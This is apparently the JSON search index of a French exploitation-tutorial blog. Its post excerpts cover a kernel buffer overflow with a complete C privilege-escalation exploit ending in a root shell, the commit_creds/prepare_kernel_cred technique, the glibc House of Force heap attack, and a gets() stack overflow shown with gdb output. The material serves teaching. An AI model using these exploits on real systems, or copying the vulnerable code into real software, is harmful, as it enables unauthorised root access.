[{"categories":["attacks","kernel"],"content":"Technique pour exploiter un buffer overflow basique cÃ´tÃ© kernel.","date":"2024-02-21","objectID":"/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/","tags":["pwn","kernel"],"title":"Buffer Overflow Basic","uri":"/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/"},{"categories":["attacks","kernel"],"content":" OverviewTout comme pour une exploitation de BoF en user-land, notre objectif va Ãªtre dâ€™overwrite la return address de la fonction vulnÃ©rable pour prendre le contrÃ´le du flow dâ€™exÃ©cution. On se place ici dans le cas oÃ¹ aucune protection nâ€™est prÃ©sente au niveau du kernel. ","date":"2024-02-21","objectID":"/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/:1:0","tags":["pwn","kernel"],"title":"Buffer Overflow Basic","uri":"/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/"},{"categories":["attacks","kernel"],"content":" DetailNotre objectif lors de lâ€™exploitation dâ€™un buffer overflow en kernel-land est de rÃ©ussir a exÃ©cuter du code user-land tout en profitant de lâ€™exÃ©cution de code kernel-land pour Ã©lever nos privilÃ¨ges. Ainsi, un schÃ©ma dâ€™attaque classique nous donnerait : Exploiter le buffer overflow. Overwrite lâ€™adresse de retour de la fonction vulnÃ©rable par lâ€™adresse de la fonction privesc(). privesc() passe les privilÃ¨ges du process, lancÃ© par notre binaire exploit, a root. Maintenant quâ€™on a des privilÃ¨ges root, on peut lancer un system(\"/bin/sh\"). ","date":"2024-02-21","objectID":"/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/:2:0","tags":["pwn","kernel"],"title":"Buffer Overflow Basic","uri":"/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/"},{"categories":["attacks","kernel"],"content":" ExploitPour implÃ©menter cette attaque, on va se mettre dans le cas oÃ¹ on peut interagir avec une device, dont la propriÃ©tÃ© write fait appel Ã  une fonction vulnÃ©rable Ã  un buffer overflow. Ainsi, lorsque lâ€™on va write() plus de caractÃ¨res quâ€™attendu, on va overflow sur la stack kernel. Pour exploiter cela, on va tout dâ€™abord devoir ouvrir la device pour interagir avec elle. int global_fd; void open_dev(){ global_fd = open(\"/dev/vulnDevice\", O_RDWR); if (global_fd \u003c 0){ puts(\"[!] Failed to open device\"); exit(-1); } else { puts(\"[*] Opened device\"); } } Ensuite on va prÃ©parer notre fonction privesc() que lâ€™on va appeler une fois avoir pris le contrÃ´le sur le flow dâ€™exÃ©cution cÃ´tÃ© kernel. Pour mieux comprendre le principe de lâ€™Ã©lÃ©vation de privilÃ¨ges cÃ´tÃ© kernel, allez voir : Kernel Privesc. unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred); unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred); void privesc(){ commit_creds = 0xc107...; prepare_kernel_cred = 0xc107...; commit_creds(prepare_kernel_cred(0)); } Maintenant quâ€™on a la fonction qui va nous permettre dâ€™Ã©lever nos privilÃ¨ges, on va pouvoir overflow sur la stack kernel et rediriger le flow dâ€™exÃ©cution vers cette fonction. void overflow(){ // Overlow at 64 bytes unsigned long long payload[17] = {0}; payload[16] = (unsigned long)privesc; write(global_fd, payload, sizeof(payload)); } GrÃ¢ce Ã  cet exploit, nous avons manipulÃ© le kernel pour quâ€™il passe le process spawn par exploit en tant que process root. Il ne nous reste plus quâ€™Ã  run un system(\"/bin/sh\") pour obtenir un shell root. En rÃ©sumÃ©, notre exploit final donne quelque chose comme : #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cfcntl.h\u003e int global_fd; unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred); unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred); void open_dev(){ global_fd = open(\"/dev/vulnDevice\", O_RDWR); if (global_fd \u003c 0){ puts(\"[!] Failed to open device\"); exit(-1); } else { puts(\"[*] Opened device\"); } } void privesc(){ commit_creds = 0xc107...; prepare_kernel_cred = 0xc107...; commit_creds(prepare_kernel_cred(0)); } void overflow(){ unsigned long long payload[17] = {0}; payload[16] = (unsigned long)privesc; write(global_fd, payload, sizeof(payload)); } int main() { open_dev(); overflow(); system(\"/bin/sh\"); return 0; } ","date":"2024-02-21","objectID":"/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/:3:0","tags":["pwn","kernel"],"title":"Buffer Overflow Basic","uri":"/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/"},{"categories":["attacks","kernel"],"content":"Introduction au pwn kernel, concept d'Ã©lÃ©vation des privilÃ¨ges d'un process.","date":"2024-02-19","objectID":"/MyLittlePwney/pwn/kernel/kernel-privesc/","tags":["pwn","kernel"],"title":"ğŸªœ Kernel Privesc ğŸªœ","uri":"/MyLittlePwney/pwn/kernel/kernel-privesc/"},{"categories":["attacks","kernel"],"content":" OverviewLâ€™objectif de ce post est dâ€™aborder la couche dâ€™abstraction nÃ©cÃ©ssaire Ã  la comprÃ©hension du pwn kernel. Pour cela, il est nÃ©cÃ©ssaire de comprendre comment les diffÃ©rents process interagissent avec le kernel, et comment un contrÃ´le de flow dâ€™execution en kernel-mode peut nous permettre dâ€™amÃ©liorer nos privilÃ¨ges en user-land. ","date":"2024-02-19","objectID":"/MyLittlePwney/pwn/kernel/kernel-privesc/:1:0","tags":["pwn","kernel"],"title":"ğŸªœ Kernel Privesc ğŸªœ","uri":"/MyLittlePwney/pwn/kernel/kernel-privesc/"},{"categories":["attacks","kernel"],"content":" Process x KernelIl est important de noter que lâ€™on interagit avec le kernel de pleins de maniÃ¨res diffÃ©rentes. Que ce soit en modifiant le filesystem, avec des syscalls, en communiquant avec des devicesâ€¦ Toutes ces actions nÃ©cÃ©ssitent une intervention du kernel au niveau des process qui les initient. Pour comprendre et manipuler les process, le kernel linux utilise une structure task_struct contenant toutes le informations dont il a besoin : PID, Ã©tat du process, niveau de permissionsâ€¦ Il sauvegarde la task_struct de tous les process en mÃ©moire, sous forme de liste chainÃ©e. ","date":"2024-02-19","objectID":"/MyLittlePwney/pwn/kernel/kernel-privesc/:2:0","tags":["pwn","kernel"],"title":"ğŸªœ Kernel Privesc ğŸªœ","uri":"/MyLittlePwney/pwn/kernel/kernel-privesc/"},{"categories":["attacks","kernel"],"content":" PrivescPuisque le kernel peut modifier la structure dâ€™un process, alors il peut modifier les permissions de ce process, et notamment les passer a root. Ainsi, si on trouve une faille niveau kernel qui nous permet de prendre le contrÃ´le du flow dâ€™execution, alors nous pouvons simplement lancer un process en user-land, augmenter ses privileges cÃ´tÃ© kernel et retourner en user-land. Pour faire cela, on va donc modifier la task_struct du process quâ€™on a lancÃ© et changer ses privilÃ¨ges. Comme les privilÃ¨ges dâ€™une task_struct sont, eux aussi, dÃ©finis sous forme de structure, on va faire appel Ã  des fonctions kernel pour modifier proprement la task_struct. /* Process credentials: */ /* Tracer's credentials at attach: */ const struct cred __rcu *ptracer_cred; /* Objective and real subjective task credentials (COW): */ const struct cred __rcu *real_cred; /* Effective (overridable) subjective task credentials (COW): */ const struct cred __rcu *cred; Les fonctions commit_creds() et prepare_kernel_cred() vont nous permettre de faire cela. Pour les appeler correctement, a partir de leur adresse, il faut dâ€™abord les dÃ©finir. unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred); unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred); void escalate_privs(void){ commit_creds = 0x...; prepare_kernel_cred = 0x...; commit_creds(prepare_kernel_cred(0)); } NB: Il y a plusieurs moyens de trouver les adresses de fonctions kernel. Le plus simple est de lire le fichier /proc/kallsyms qui map les adresses et le symboles kernels. II ne reste donc plus quâ€™Ã  appeler la fonction escalate_privs(). Ce qui nâ€™est possible que si le kernel a des droits dâ€™execution en user-land (pas de SMEP). Sinon il faudra trouver un moyen dÃ©tournÃ© de faire lâ€™appel aux fonctions. Et maintenant le process dÃ©tient des privilÃ¨ges root sur la machine. ","date":"2024-02-19","objectID":"/MyLittlePwney/pwn/kernel/kernel-privesc/:3:0","tags":["pwn","kernel"],"title":"ğŸªœ Kernel Privesc ğŸªœ","uri":"/MyLittlePwney/pwn/kernel/kernel-privesc/"},{"categories":["attacks","kernel"],"content":" TLDRPour simplifier, le but est dâ€™exploiter une vulnerabilitÃ© pour prendre le contrÃ´le du flow dâ€™execution cÃ´tÃ© kernel. Ensuite, on va utiliser les fonctions kernel commit_creds() et prepare_kernel_cred() pour modifier les privilÃ¨ges de notre process. Enfin, on va retourner en user-land pour continuer lâ€™execution de notre process avec les privilÃ¨ges ameliorÃ©s. ","date":"2024-02-19","objectID":"/MyLittlePwney/pwn/kernel/kernel-privesc/:4:0","tags":["pwn","kernel"],"title":"ğŸªœ Kernel Privesc ğŸªœ","uri":"/MyLittlePwney/pwn/kernel/kernel-privesc/"},{"categories":["heap","attacks"],"content":"fa-solid fa-trash-can fa-fw fa-sm","date":"2023-02-20","objectID":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/","tags":["pwn","heap"],"title":"ğŸ”¥ House of Force ğŸ”¥","uri":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/"},{"categories":["heap","attacks"],"content":" OverviewLâ€™objectif de cette attaque est dâ€™overwrite les metadata du top chunk pour augmenter sa size. Ainsi on va pouvoir faire des malloc sur un espace mÃ©moire beaucoup plus grand et donc malloc en dehors de la HEAP. ","date":"2023-02-20","objectID":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/:1:0","tags":["pwn","heap"],"title":"ğŸ”¥ House of Force ğŸ”¥","uri":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/"},{"categories":["heap","attacks"],"content":" DetailDans les versions de la GLIBC \u003c 2.29, il nâ€™y a pas de check sur lâ€™intÃ©gritÃ© des metadata du top chunk. Ainsi, si la size du top chunk est overwrite, lâ€™algorithme malloc fonctionnera quand mÃªme. Comme les chunks sont allouÃ©s Ã  partir du top chunk, si on overwrite la size du top chunk, on devrait Ãªtre en mesure de couvrir lâ€™ensemble des adresses de la mÃ©moire, y compris les addresses en dehors de la heap. Lâ€™intÃ©rÃªt de cette attaque est de pouvoir overwrite des valeurs Ã  des adresses plus basses que lâ€™adresse de la HEAP. Voir de simplement overwrite des valeurs en dehors de la HEAP. ","date":"2023-02-20","objectID":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/:2:0","tags":["pwn","heap"],"title":"ğŸ”¥ House of Force ğŸ”¥","uri":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/"},{"categories":["heap","attacks"],"content":" ExploitLâ€™attaque en elle mÃªme se dÃ©roule en 3 Ã©tapes : Overflow notre buffer et overwrite la size du top chunk. On va le set Ã  une valeur suffisamment grande pour que lâ€™adresse ciblÃ©e soit comprise dans la range dâ€™adresses couvertes par le top chunk. On fait un malloc pour placer le dÃ©but du top chunk juste avant lâ€™adresse ciblÃ©e. On effectue un nouveau malloc() qui va nous permettre dâ€™atteindre lâ€™adresse ciblÃ©e. ","date":"2023-02-20","objectID":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/:3:0","tags":["pwn","heap"],"title":"ğŸ”¥ House of Force ğŸ”¥","uri":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/"},{"categories":["heap","attacks"],"content":" Further usePour aller plus loin, on peut tenter dâ€™utiliser cette attaque pour obtenir un shell. Pour cela, un stratÃ©gie peut Ãªtre dâ€™overwrite lâ€™adresse du Malloc hook. Ce dernier Ã©tant utilisÃ© Ã  chaque appel de la fonction malloc(), on peut le remplacer par lâ€™adresse de la fonction system() et lui passer une adresse pointant vers un \"/bin/sh\". Ainsi, chaque nouvel appel Ã  la fonction malloc() va hook vers un appel Ã  system(). ","date":"2023-02-20","objectID":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/:4:0","tags":["pwn","heap"],"title":"ğŸ”¥ House of Force ğŸ”¥","uri":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/"},{"categories":["heap","attacks"],"content":" LimitationsA partir de la GLIBC 2.29, la size du top chunk est vÃ©rifiÃ©e pour sâ€™assurer que le top chunk ne sorte pas de sa zone mÃ©moire. GLIBC Top Chunk Size check ","date":"2023-02-20","objectID":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/:5:0","tags":["pwn","heap"],"title":"ğŸ”¥ House of Force ğŸ”¥","uri":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/"},{"categories":null,"content":" The BugLe Buffer Overflow est un bug qui se produit lorsquâ€™un programme ecrit dans un buffer plus de bytes que le buffer ne peut en accueillir. Ce que lâ€™on designe par le terme de buffer est une zone memoire dont le programme controle le contenu. Cela peut representer nâ€™importe quel element present en memoire (variables, constantes, zone memoire dynamiqueâ€¦). Le probleme avec ce bug etant que le programme tout entier sâ€™appuie sur la memoire pour fonctionner. Ainsi en debordant du buffer le programme va potentiellement reecrire dâ€™autres elements presents en memoire et donc des element necessaire a son propre fonctionnement, ce qui va souvent provoquer un crash. ","date":"0001-01-01","objectID":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/:1:0","tags":null,"title":"","uri":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/"},{"categories":null,"content":" Demonstration du BugPour que ce soit plus parlant voici un exemple tres basique que lâ€™on va etudier en assembleur pour mieux comprendre le reel fonctionnement du programme et comment il interragit avec la memoire. #include \u003cstdio.h\u003e int main(){ int check = 0; char buffer[16]; gets(buffer); if (check == 0x1337) printf(\"Well Done!!\"); return 0; } ","date":"0001-01-01","objectID":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/:2:0","tags":null,"title":"","uri":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/"},{"categories":null,"content":" AnalysisLe programme est tres simple. Il defini une variable check quâ€™il initialise a 0. Il defini ensuite un tableau de caracteres, que lâ€™on peu definir comme un buffer puisque un tableau de 16 carateres reprensente concretement une zone memoire de 16 bytes reservee a cette variable. Ensuite, il lit depuis lâ€™entree standard et save lâ€™input lu dans le buffer. Enfin, il verifie que la variable check est bien egale a 0x1337. Ca peut paraitre un peu bizarre. Pourquoi la variable check serait egale a 0x1337 si elle a ete initialisee a 0 et inchangee. Et bien peut etre que le programme est vulnerable et que lâ€™on peut reecrire la valeur de check ğŸ˜ˆ. Si on sâ€™en referre a la man page de gets(), on se rend compte que la fonction gets() lit la premiere ligne de lâ€™entree standard (stdin) et la sauvegarde dans le buffer passe en parametre. DESCRIPTION gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte ('\\0'). No check for buffer overrun is performed (see BUGS below). Wait, wait, waitâ€¦ Si gets() lit la premiere ligne de stdin, et que notre buffer ne peut accueilir que 16 bytes, que se passe-t-il si la ligne lu fait plus de 16 bytes? ","date":"0001-01-01","objectID":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/:2:1","tags":null,"title":"","uri":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/"},{"categories":null,"content":" AssemblyPour le comprendre, regardons ce que fait le programme en bas niveau : push rbp mov rbp,rsp sub rsp,0x20 mov DWORD PTR [rbp-0x4],0x0 lea rax,[rbp-0x20] mov rdi,rax mov eax,0x0 call 0x1040 \u003cgets@plt\u003e cmp DWORD PTR [rbp-0x4],0x1337 jne 0x1186 \u003cmain+61\u003e lea rax,[rip+0xe8b] # 0x2004 mov rdi,rax mov eax,0x0 call 0x1030 \u003cprintf@plt\u003e mov eax,0x0 leave ret Concretement, il y a 2 parties interressantes a regarder : Dâ€™abord, le programme va sauvegarder la valeur de check sur la stack. mov DWORD PTR [rbp-0x4],0x0 Ensuite il reserve une zone memoire de minimum 16 bytes (sur la stack) et passe son adresse en argunent a gets(). lea rax,[rbp-0x20] mov rdi,rax mov eax,0x0 call 0x1040 \u003cgets@plt\u003e Ainsi, si on deroule lâ€™execution du programme notre stack va ressembler a quelque chose comme ca: [SCHEMA] ","date":"0001-01-01","objectID":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/:2:2","tags":null,"title":"","uri":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/"},{"categories":null,"content":" ExploitSi on sâ€™interesse a ce que fait reelement la fonction gets(), elle prend tout simplement un adresse memoire (ici lâ€™adresse de notre buffer), et y ecrit les bytes lus depuis lâ€™entree standard. Le probleme est quâ€™a lâ€™adresse de buffer+0x1c, il y a la valeur de check. Donc si gets lit plus de 28 bytes, il va ecrire par dessus la valeur de check. [SCHEMA] Si on lance un debugger, quâ€™on test notre exploit et quâ€™on break sur lâ€™instruction qui verifie la valeur de check, on peut voir quâ€™on a bien reecrit la valeur de check sauvegardee en memoire. (gdb) disas main Dump of assembler code for function main: 0x0000000000001149 \u003c+0\u003e: push rbp 0x000000000000114a \u003c+1\u003e: mov rbp,rsp 0x000000000000114d \u003c+4\u003e: sub rsp,0x20 0x0000000000001151 \u003c+8\u003e: mov DWORD PTR [rbp-0x4],0x0 0x0000000000001158 \u003c+15\u003e: lea rax,[rbp-0x20] 0x000000000000115c \u003c+19\u003e: mov rdi,rax 0x000000000000115f \u003c+22\u003e: mov eax,0x0 0x0000000000001164 \u003c+27\u003e: call 0x1040 \u003cgets@plt\u003e 0x0000000000001169 \u003c+32\u003e: cmp DWORD PTR [rbp-0x4],0x1337 0x0000000000001170 \u003c+39\u003e: jne 0x1186 \u003cmain+61\u003e 0x0000000000001172 \u003c+41\u003e: lea rax,[rip+0xe8b] # 0x2004 0x0000000000001179 \u003c+48\u003e: mov rdi,rax 0x000000000000117c \u003c+51\u003e: mov eax,0x0 0x0000000000001181 \u003c+56\u003e: call 0x1030 \u003cprintf@plt\u003e 0x0000000000001186 \u003c+61\u003e: mov eax,0x0 0x000000000000118b \u003c+66\u003e: leave 0x000000000000118c \u003c+67\u003e: ret (gdb) b *main+32 Breakpoint 1 at 0x1169 (gdb) r Starting program: /root/a.out AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB On inspecte le contexte dans lequel on a break dans gdb. (gdb) x/i $rip =\u003e 0x555555555169 \u003cmain+32\u003e: cmp DWORD PTR [rbp-0x4],0x1337 (gdb) x/wx $rbp-0x4 0x7fffffffe2dc: 0x42424242 On a donc bien reussi a overwrite la valeur de check ğŸ™‚. ","date":"0001-01-01","objectID":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/:2:3","tags":null,"title":"","uri":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/"},{"categories":null,"content":" Scripting the ExploitPour finaliser la technique dâ€™exploitation, on va faire un petit script python qui va gerer toutes les interactions a notre place. ","date":"0001-01-01","objectID":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/:2:4","tags":null,"title":"","uri":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/"}]